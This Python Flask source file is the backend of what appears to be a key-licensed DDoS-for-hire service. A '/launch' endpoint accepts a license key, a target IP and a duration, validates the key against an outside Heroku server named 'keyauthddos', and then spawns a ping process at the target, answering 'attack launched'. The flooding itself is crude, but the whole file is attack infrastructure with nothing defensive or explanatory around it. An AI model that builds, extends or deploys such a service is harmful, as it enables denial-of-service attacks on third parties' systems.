from flask import Flask, request, jsonify
import subprocess
import os
import requests

app = Flask(__name__)

# Replace with your Heroku key server
KEY_SERVER_URL = "https://keyauthddos.herokuapp.com/validate_key"

@app.route("/launch", methods=["POST"])
def launch_attack():
    data = request.get_json()
    key = data.get("key")
    ip = data.get("ip")
    duration = data.get("duration", 3)

    if not key or not ip:
        return jsonify({"error": "Missing key or IP"}), 400

    # Validate key
    try:
        res = requests.post(KEY_SERVER_URL, json={
            "key": key,
            "ip_address": request.remote_addr
        })
        if res.status_code != 200:
            return jsonify({"error": "Key validation failed"}), 403
    except Exception as e:
        return jsonify({"error": f"Validation error: {e}"}), 500

    try:
        subprocess.Popen(["ping", ip, "-n", str(duration * 10)])
        return jsonify({"status": "attack launched", "duration": duration})
    except Exception as e:
        return jsonify({"error": f"Attack error: {e}"}), 500

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port)
